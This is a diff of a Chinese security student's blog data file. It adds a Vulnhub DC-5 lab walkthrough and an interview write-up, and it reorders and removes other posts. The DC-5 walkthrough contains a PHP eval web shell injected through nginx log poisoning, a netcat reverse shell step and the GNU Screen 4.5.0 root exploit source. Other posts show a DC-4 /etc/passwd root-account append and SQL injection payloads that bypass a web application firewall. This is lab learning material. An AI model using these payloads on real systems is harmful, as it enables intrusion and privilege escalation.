+<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#114;&#111;&#x6f;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#56;&#x2e;&#x31;&#x34;&#52;">&#114;&#111;&#x6f;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#56;&#x2e;&#x31;&#x34;&#52;</a>成功登录root用户</p>
+<p>Reference</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/weixin_52049485/article/details/112248860">https://blog.csdn.net/weixin_52049485/article/details/112248860</a><br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13217674.html">https://www.cnblogs.com/PANDA-Mosen/p/13217674.html</a><br><a href="https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/">https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/</a></p>
+</blockquote>
 ]]></content>
       <categories>
-        <category>DCchallenges</category>
+        <category>vulhub</category>
       </categories>
       <tags>
-        <tag>DCchallenges</tag>
+        <tag>vulhub</tag>
       </tags>
   </entry>
   <entry>
@@ -464,8 +393,8 @@
 <p>得到 <code>jim  jibril04</code></p>
 <p>连接ssh</p>
 <blockquote>
-<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#x6a;&#105;&#x6d;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#x38;&#46;&#49;&#51;&#53;">&#x6a;&#105;&#x6d;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#x38;&#46;&#49;&#51;&#53;</a></strong></p>
-<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#106;&#105;&#109;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x31;&#56;&#46;&#x31;&#x33;&#53;">&#106;&#105;&#109;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x31;&#56;&#46;&#x31;&#x33;&#53;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
+<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#x6a;&#x69;&#x6d;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x31;&#56;&#46;&#49;&#x33;&#x35;">&#x6a;&#x69;&#x6d;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x31;&#56;&#46;&#49;&#x33;&#x35;</a></strong></p>
+<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x6a;&#x69;&#x6d;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#x38;&#46;&#x31;&#51;&#53;">&#x6a;&#x69;&#x6d;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#x38;&#46;&#x31;&#51;&#53;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
 <p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
 <p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
 <p><strong>jim@dc-4:~$ pwd</strong></p>
@@ -513,7 +442,7 @@
 <p>Mamor:x:0:0:::/bin/bash</p>
 <p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
 <blockquote>
-<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#97;&#x6d;&#x6f;&#x72;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#56;&#46;&#49;&#51;&#53;">&#77;&#97;&#x6d;&#x6f;&#x72;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#56;&#46;&#49;&#51;&#53;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#77;&#x61;&#109;&#111;&#114;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#x31;&#x38;&#46;&#49;&#x33;&#x35;">&#77;&#x61;&#109;&#111;&#114;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#x31;&#x38;&#46;&#49;&#x33;&#x35;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#97;&#x6d;&#111;&#114;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#x38;&#46;&#49;&#51;&#x35;">&#77;&#97;&#x6d;&#111;&#114;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#x38;&#46;&#49;&#51;&#x35;</a>‘s password: </p>
+<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#x61;&#109;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#49;&#56;&#x2e;&#49;&#51;&#53;">&#77;&#x61;&#109;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#49;&#56;&#x2e;&#49;&#51;&#53;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x4d;&#97;&#109;&#111;&#114;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#x31;&#x38;&#46;&#x31;&#51;&#53;">&#x4d;&#97;&#109;&#111;&#114;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#x31;&#x38;&#46;&#x31;&#51;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#97;&#109;&#x6f;&#x72;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#x38;&#x2e;&#x31;&#51;&#x35;">&#77;&#97;&#109;&#x6f;&#x72;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#x38;&#x2e;&#x31;&#51;&#x35;</a>‘s password: </p>
 <p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
 </blockquote>
 <p>构造失败，重新构造一个</p>
@@ -565,6 +494,77 @@
 <p><a href="https://www.pianshen.com/article/9999990100/">https://www.pianshen.com/article/9999990100/</a></p>
 <p><a href="https://blog.csdn.net/Nicky_Zheng/article/details/113173929">https://blog.csdn.net/Nicky_Zheng/article/details/113173929</a></p>
 </blockquote>
+]]></content>
+      <categories>
+        <category>DCchallenges</category>
+      </categories>
+      <tags>
+        <tag>DCchallenges</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DCchallenges5</title>
+    <url>/posts/7a861522/</url>
+    <content><![CDATA[<p>环境</p>
+<blockquote>
+<p>网段 192.168.18.0/24</p>
+<p>kali      192.168.18.131</p>
+<p>靶机  192.168.18.136</p>
+</blockquote>
+<p>nmap扫网段</p>
+<blockquote>
+<p>kali@kali2020:~$ sudo nmap -sn 192.168.18.0/24<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:51 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.00035s latency).<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00044s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 4.25 seconds</p>
+</blockquote>
+<p>nmap扫靶机端口</p>
+<blockquote>
+<p>kali@kali2020:~$ sudo nmap 192.168.18.136 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:56 CST<br>Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 66.67% done; ETC: 13:56 (0:00:06 remaining)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.0015s latency).<br>Not shown: 65532 closed ports<br>PORT      STATE SERVICE VERSION<br><strong>80/tcp    open  http    nginx 1.6.2</strong><br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>60416/tcp open  status  1 (RPC #100024)<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds</p>
+</blockquote>
+<p>开放了80、111和60416,80端口使用的nginx</p>
+<p>dirsearch扫目录<code>python3 dirsearch.py  -u 192.168.18.136</code></p>
+<blockquote>
+<p>[14:06:36] Starting:<br>[14:06:43] 200 -    4KB - /contact.php<br>[14:06:43] 301 -  184B  - /css  -&gt;  <a href="http://192.168.18.136/css/">http://192.168.18.136/css/</a><br>[14:06:44] 200 -    6KB - /faq.php<br>[14:06:45] 301 -  184B  - /images  -&gt;  <a href="http://192.168.18.136/images/">http://192.168.18.136/images/</a><br>[14:06:45] 403 -  570B  - /images/<br>[14:06:45] 200 -    4KB - /index.php<br>[14:06:48] 200 -  852B  - /thankyou.php                               </p>
+</blockquote>
+<p>进入主页没看到啥提示，只有一个留言板，随便填一下看看有啥东西</p>
+<p>抓包发送数据，发现多次发送下面的<code>Copyright © 2019</code>会变化</p>
+<p>可以推测使用了footer.php，访问footer.php时年份会改变</p>
+<p>访问<code>http://192.168.18.136/footer.php</code>，年份会变化</p>
+<p>可以推测thankyou.php包含了footer.php</p>
+<p>试一下file=index.php<br><img src="/posts/7a861522/burp_fileindex.png"><br><img src="/posts/7a861522/file_index.png"><br><img src="/posts/7a861522/burp_fileetcpasswd.png"><br><br></p>
+<p>由于时nginx,访问下他的日志</p>
+<p><code>/var/log/nginx/error.log</code><br><img src="/posts/7a861522/burp_errorlog.png"><br><code>/var/log/nginx/access.log </code><br><img src="/posts/7a861522/burp_accesslog.png"><br>尝试写入日志文件来反弹shell<br><img src="/posts/7a861522/burp_eval.png"><br><code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;])?&gt;;</code><br><img src="/posts/7a861522/burp_phpinfo.png"><br>使用蚁剑连接shell<br><img src="/posts/7a861522/antsword.png"><br>whoami查看权限为<code>www-data</code>没有权限去访问/root</p>
+<p>nc命令反弹shell<br><img src="/posts/7a861522/nc_shell.png"><br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><br><br>提权</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<blockquote>
+<p>www-data@dc-5:~/html$ find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/screen-4.5.0<br>/usr/bin/gpasswd<br>/usr/bin/procmail<br>/usr/bin/at<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/sbin/exim4<br>/sbin/mount.nfs</p>
+</blockquote>
+<p>使用screen</p>
+<blockquote>
+<p>kali@kali2020:~$ searchsploit screen 4.5.0</p>
+<hr>
+<p> Exploit Title                            |  Path</p>
+<hr>
+<p>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41152.txt<br>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41154.sh</p>
+<hr>
+<p>Shellcodes: No Results<br>kali@kali2020:<del>/Tools$ cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh<br>kali@kali2020:</del>/Tools$ cat 41154.sh </p>
+</blockquote>
+<p>根据说明第一部分保存为<code>libhax.c</code></p>
+<blockquote>
+<p>#include &lt;stdio.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;unistd.h&gt;<br><strong>attribute</strong> ((<strong>constructor</strong>))<br>void dropshell(void){<br>    chown(“/tmp/rootshell”, 0, 0);<br>    chmod(“/tmp/rootshell”, 04755);<br>    unlink(“/etc/ld.so.preload”);<br>    printf(“[+] done!\n”);<br>}</p>
+</blockquote>
+<p>第二部分保存为<code>rootshell.c</code></p>
+<blockquote>
+<p>#include &lt;stdio.h&gt;<br>int main(void){<br>    setuid(0);<br>    setgid(0);<br>    seteuid(0);<br>    setegid(0);<br>    execvp(“/bin/sh”, NULL, NULL);<br>}</p>
+</blockquote>
+<p>编译</p>
+<p><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></p>
+<p><code>gcc -o rootshell rootshell.c</code></p>
+<p>将第三部分保存为exp.sh</p>
+<br>
+
+<br>
+
+<p>把三个文件通过蚁剑传到靶机中<br><img src="/posts/7a861522/upload.png"><br><img src="/posts/7a861522/exp.png"><br><img src="/posts/7a861522/flag.png"></p>
 ]]></content>
       <categories>
         <category>DCchallenges</category>
@@ -1350,18 +1350,6 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo设置多个标签或分类</title>
-    <url>/posts/d7c641b4/</url>
-    <content><![CDATA[<p><code>tag: [tag1,tag2,tag3]</code><br><code>categories: [categories1,categories2,categories3]</code></p>
-]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hexo文章模板设置</title>
     <url>/posts/2b14b1c3/</url>
     <content><![CDATA[<p>打开hexo项目文件夹张的scaffold中的<code>post.md</code>和<code>draft.md</code>,并修改<br>对应的是 <code>hexo new &lt;title&gt;</code> 默认是<code>post</code>，草稿是<code>draft</code></p>
@@ -1379,15 +1367,15 @@
       </tags>
   </entry>
   <entry>
-    <title>kali安装pip2</title>
-    <url>/posts/6b338ac1/</url>
-    <content><![CDATA[<p><code>kali 安装pip2</code><br><code>wget https://bootstrap.pypa.io/pip/2.6/get-pip.py</code><br><code>sudo python2 get-pip.py</code><br><code>pip2 -V</code><br>升级版本<br><code>sudo pip2 install --upgrade pip</code></p>
+    <title>hexo设置多个标签或分类</title>
+    <url>/posts/d7c641b4/</url>
+    <content><![CDATA[<p><code>tag: [tag1,tag2,tag3]</code><br><code>categories: [categories1,categories2,categories3]</code></p>
 ]]></content>
       <categories>
-        <category>Linux</category>
+        <category>Hexo</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
+        <tag>Hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -1415,9 +1403,16 @@
       </tags>
   </entry>
   <entry>
-    <title>proxychain4配置——虚拟机无法正常走代理</title>
-    <url>/posts/45d6c023/</url>
-    <content><![CDATA[]]></content>
+    <title>kali安装pip2</title>
+    <url>/posts/6b338ac1/</url>
+    <content><![CDATA[<p><code>kali 安装pip2</code><br><code>wget https://bootstrap.pypa.io/pip/2.6/get-pip.py</code><br><code>sudo python2 get-pip.py</code><br><code>pip2 -V</code><br>升级版本<br><code>sudo pip2 install --upgrade pip</code></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
   </entry>
   <entry>
     <title>phpstudy访问localhost不出现目录的问题</title>
@@ -1430,6 +1425,11 @@
       <tags>
         <tag>phpstudy</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>proxychain4配置——虚拟机无法正常走代理</title>
+    <url>/posts/45d6c023/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>sqli-labs2</title>
@@ -1858,6 +1858,11 @@
       </tags>
   </entry>
   <entry>
+    <title>upload-labs1</title>
+    <url>/posts/685229a3/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>sqli-labs总结</title>
     <url>/posts/6db7f8ba/</url>
     <content><![CDATA[]]></content>
@@ -1867,11 +1872,6 @@
       <tags>
         <tag>SQLi</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>upload-labs1</title>
-    <url>/posts/685229a3/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>xss-labs1</title>
@@ -2149,6 +2149,48 @@
       </tags>
   </entry>
   <entry>
+    <title>记一次hw面试经历(1)</title>
+    <url>/posts/40769f33/</url>
+    <content><![CDATA[<h1 id="一面"><a href="#一面" class="headerlink" title="一面:"></a>一面:</h1><h3 id="如何接触网络安全的"><a href="#如何接触网络安全的" class="headerlink" title="如何接触网络安全的"></a>如何接触网络安全的</h3><p>答：在大一时开始接触CTF，那时候开始正式接触安全，然后后面主要是学习的web安全，经常会看先知社区，freebuf，csdn和乌云<span id="more"></span>之类的社区文章学习</p>
+<h3 id="有无接触过安全设备"><a href="#有无接触过安全设备" class="headerlink" title="有无接触过安全设备"></a>有无接触过安全设备</h3><p>答：没接触过。</p>
+<h3 id="是否熟悉windows或者linux命令的使用"><a href="#是否熟悉windows或者linux命令的使用" class="headerlink" title="是否熟悉windows或者linux命令的使用"></a>是否熟悉windows或者linux命令的使用</h3><p>答：之前有学习过Linux，对于Linux和Windows的基本命令操作<!--more-->都可以熟悉使用。&lt; !–more–&gt;</p>
+<h3 id="说一下如何进行信息收集"><a href="#说一下如何进行信息收集" class="headerlink" title="说一下如何进行信息收集"></a>说一下如何进行信息收集</h3><p>答：略</p>
+<h3 id="sql注入写shell的条件"><a href="#sql注入写shell的条件" class="headerlink" title="sql注入写shell的条件"></a>sql注入写shell的条件</h3><p>答：<br>1.拥有root权限<br>2.知道网站绝对路径<br>3.开启PHP的全局gpc<br>4 在写入的目录下有写入权限</p>
+<h3 id="xss的防御"><a href="#xss的防御" class="headerlink" title="xss的防御"></a>xss的防御</h3><p>答：1.进行实体编码<br>       2.对特殊字符进行过滤</p>
+<h3 id="说一下ssrf的原理及利用"><a href="#说一下ssrf的原理及利用" class="headerlink" title="说一下ssrf的原理及利用"></a>说一下ssrf的原理及利用</h3><p>答：ssrf是一个攻击者构造形成从服务器端发起的安全漏洞，一般在服务器获取图片，文本之类的地方看到有引用其他文件的地方可以尝试一下是否有ssrf存在<br>利用：<br>1.可以用来对内网端口扫描<br>2.进行文件读取</p>
+<h3 id="有没有接触过shiro漏洞"><a href="#有没有接触过shiro漏洞" class="headerlink" title="有没有接触过shiro漏洞"></a>有没有接触过shiro漏洞</h3><p>答：记着以前复现过shiro的反序列化，主要是在rememberme处，其解析为rememberme的cookie值– base64–aes解密–反序列化</p>
+<h3 id="有没有溯源的经历"><a href="#有没有溯源的经历" class="headerlink" title="有没有溯源的经历"></a>有没有溯源的经历</h3><p>答：之前学校图书馆有过一次被入侵的经历，当时去看了一下，由于第一次接触就学了下相关内容</p>
+<h3 id="说一下应急响应的基本流程"><a href="#说一下应急响应的基本流程" class="headerlink" title="说一下应急响应的基本流程"></a>说一下应急响应的基本流程</h3><p>答：对于Windows端的后门排除</p>
+<h4 id="可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等"><a href="#可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等" class="headerlink" title="可以使用一些安全工具：d盾，logparser，autoruns，process explorer等"></a>可以使用一些安全工具：d盾，logparser，autoruns，process explorer等</h4><h4 id="项目检查"><a href="#项目检查" class="headerlink" title="项目检查"></a>项目检查</h4><p>注册表启动项<br>网络连接<br>恶意进程<br>系统服务<br>计划任务</p>
+<h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>可以使用logparser格式化后进行分析<br>也可以使用Windows的事件查看器进行分析</p>
+<h4 id="检查是否存在shift粘滞键后门"><a href="#检查是否存在shift粘滞键后门" class="headerlink" title="检查是否存在shift粘滞键后门"></a>检查是否存在shift粘滞键后门</h4><p>对于Linux端<br>1.查看异常账号        cat /etc/passwd<br>2.查看进程              ps -ef 丨more<br>3.查看网络连接       netstat -anplt<br>4.计划任务<br>5.系统启动项<br>6.系统日志</p>
+<h4 id="对于web服务器"><a href="#对于web服务器" class="headerlink" title="对于web服务器"></a>对于web服务器</h4><p>可以查看中间件配置和相关日志<br>当然也要考虑浏览器劫持问题<br>f12查看网络的加载</p>
+<h3 id="有没有面试过其他公司的hw"><a href="#有没有面试过其他公司的hw" class="headerlink" title="有没有面试过其他公司的hw"></a>有没有面试过其他公司的hw</h3><p>答：没有</p>
+<h3 id="期望的薪资是多少"><a href="#期望的薪资是多少" class="headerlink" title="期望的薪资是多少"></a>期望的薪资是多少</h3><p><em>面试难度：易<br>面试结果：通过</em></p>
+<h1 id="二面"><a href="#二面" class="headerlink" title="二面:"></a>二面:</h1><h3 id="你好，我们是xxx，请问你是xxx吗，现在方便吗？"><a href="#你好，我们是xxx，请问你是xxx吗，现在方便吗？" class="headerlink" title="你好，我们是xxx，请问你是xxx吗，现在方便吗？"></a>你好，我们是xxx，请问你是xxx吗，现在方便吗？</h3><p>答：您好，是的，现在方便，您讲。</p>
+<h3 id="你先说一下什么是护网，护网的背景"><a href="#你先说一下什么是护网，护网的背景" class="headerlink" title="你先说一下什么是护网，护网的背景"></a>你先说一下什么是护网，护网的背景</h3><p>答：略</p>
+<h3 id="说一下hw防守方流程"><a href="#说一下hw防守方流程" class="headerlink" title="说一下hw防守方流程"></a>说一下hw防守方流程</h3><p>答：前期需要对资产进行梳理，排查暴露面和敏感信息，中期要7*24h值守，及时写日报和周报，后期就需要总结和整改</p>
+<h3 id="你说一下struct2-特征"><a href="#你说一下struct2-特征" class="headerlink" title="你说一下struct2 特征"></a>你说一下struct2 特征</h3><p>答：没怎么了解过，只知道有rce漏洞（.action .do）</p>
+<h3 id="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"><a href="#看你简历上有过图书馆溯源经历，你简单说一下溯源经历" class="headerlink" title="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"></a>看你简历上有过图书馆溯源经历，你简单说一下溯源经历</h3><p>答：去年我们学校图书馆又被入侵过，老师让我们过去看一下，因为当时是第一次接触，就学习一下</p>
+<h3 id="使用事件查看器查看一下是否存在异常事件"><a href="#使用事件查看器查看一下是否存在异常事件" class="headerlink" title="使用事件查看器查看一下是否存在异常事件"></a>使用事件查看器查看一下是否存在异常事件</h3><h3 id="那你说一下异常事件有哪些？"><a href="#那你说一下异常事件有哪些？" class="headerlink" title="那你说一下异常事件有哪些？"></a>那你说一下异常事件有哪些？</h3><p>答：这个不是很了解</p>
+<h3 id="那你继续说"><a href="#那你继续说" class="headerlink" title="那你继续说"></a>那你继续说</h3><p>答：可以查看一下开放的端口，并关闭一些不必要的</p>
+<h3 id="那你用什么查看呢"><a href="#那你用什么查看呢" class="headerlink" title="那你用什么查看呢"></a>那你用什么查看呢</h3><p>答：netstat -anlpt</p>
+<h3 id="那你都关闭了那些端口呢"><a href="#那你都关闭了那些端口呢" class="headerlink" title="那你都关闭了那些端口呢"></a>那你都关闭了那些端口呢</h3><p>答：这个好像不太记得了，好像关闭了3389之类的，还关闭了一个数据库的应该是，记不清楚了，因为这个图书馆管理系统是老师自己用phpstudy搭建的。当时还查看了一下系统账号发现有几个被人添加过的账号，也存在隐藏用户</p>
+<h3 id="那你说一下是怎么发现隐藏账户的呢"><a href="#那你说一下是怎么发现隐藏账户的呢" class="headerlink" title="那你说一下是怎么发现隐藏账户的呢"></a>那你说一下是怎么发现隐藏账户的呢</h3><p>答：我记着在注册表的“sam”（当时记不起来具体叫什么了）然后去找是否存在隐藏账号</p>
+<h3 id="那隐藏账户有什么特征呢？"><a href="#那隐藏账户有什么特征呢？" class="headerlink" title="那隐藏账户有什么特征呢？"></a>那隐藏账户有什么特征呢？</h3><p>答：隐藏账户都会有~（当时忘记了是$，然后hr也有点疑问，但就是没想起来，隐藏用户用$符，当时回答时错说成了~隐藏用户<br>查看注册表 sam下 domains account users查看users表项中与names表项中项数量是否一致如果一致就没有隐藏用户如果不一致，就对照其他电脑用户注册表，即可找出其他隐藏用户事件查看器，查看异常事件）</p>
+<h3 id="那你是怎么去查看日志的呢？"><a href="#那你是怎么去查看日志的呢？" class="headerlink" title="那你是怎么去查看日志的呢？"></a>那你是怎么去查看日志的呢？</h3><p>答：那个系统是好像一个window2008，使用的是Apache，一般Apache的日志好像是httpd</p>
+<h3 id="是httpd吗？"><a href="#是httpd吗？" class="headerlink" title="是httpd吗？"></a>是httpd吗？</h3><p>答：这个我有些忘记了，不好意思（当时没想出来，logs/access.log和log/error.log）</p>
+<h3 id="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"><a href="#hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。" class="headerlink" title="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"></a>hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。</h3><p>答：好的，麻烦您了，再见~</p>
+<p><em>面试来的挺突然的，当时刚要去出去吃晚饭，总共聊了10分钟，感觉回答的不是很好，最后凉了😭</em></p>
+]]></content>
+      <categories>
+        <category>面试</category>
+      </categories>
+      <tags>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用proxychains4gitclone拒绝访问</title>
     <url>/posts/3a6e39d4/</url>
     <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
@@ -2161,104 +2203,21 @@
       </tags>
   </entry>
   <entry>
-    <title>安全狗sqli绕过</title>
-    <url>/posts/3b69da4f/</url>
-    <content><![CDATA[<h4 id="and-1-1-绕过"><a href="#and-1-1-绕过" class="headerlink" title="and 1=1 绕过"></a>and 1=1 绕过</h4><p><img src="/posts/3b69da4f/1.png"></p>
-<p>正常使用 <code>?id=tom&#39; and 1=1 --+</code>会被拦截<br><img src="/posts/3b69da4f/2.png"></p>
-<h5 id="使用-amp-amp-替换and"><a href="#使用-amp-amp-替换and" class="headerlink" title="使用&amp;&amp;替换and"></a>使用<code>&amp;&amp;</code>替换and</h5><p><img src="/posts/3b69da4f/3.png"><br>无法绕过</p>
-<h5 id="使用内联注释-！11440"><a href="#使用内联注释-！11440" class="headerlink" title="使用内联注释/*！11440 */"></a>使用内联注释<code>/*！11440 */</code></h5><p><img src="/posts/3b69da4f/4.png"></p>
-<p><img src="/posts/3b69da4f/8.png"><br>可以绕过<br><br></p>
-<h5 id="继续使用and"><a href="#继续使用and" class="headerlink" title="继续使用and"></a>继续使用and</h5><p>and 0x1</p>
-<p>可以使用十六进制绕过</p>
-<br>
-##### http参数污染
-![](14.png)
-<br>
-
-<hr>
-<br>
-
-<br>
-
-<h4 id="order-by绕过"><a href="#order-by绕过" class="headerlink" title="order by绕过"></a>order by绕过</h4><h5 id="使用换行符和注释绕过"><a href="#使用换行符和注释绕过" class="headerlink" title="使用换行符和注释绕过"></a>使用换行符和注释绕过</h5><p><code>?name=tom&#39;/**/order/*/%0A*/by/**/3%23</code></p>
-<p><img src="/posts/3b69da4f/6.png"><br><img src="/posts/3b69da4f/7.png"></p>
-<h5 id="使用http参数污染"><a href="#使用http参数污染" class="headerlink" title="使用http参数污染"></a>使用http参数污染</h5><p><code>name=tom1&#39; /*&amp;name=tom&#39; order by 3%23*/</code><br><img src="http1.png"><br><img src="http2.png"></p>
-<br>
-
-<hr>
-<h4 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h4><h5 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h5><p>尝试使用<code>?id=tom&#39; union/*!11440select*/ 1,2,3 --+</code></p>
-<p>fuzz跑了下10000-99999都无法绕过</p>
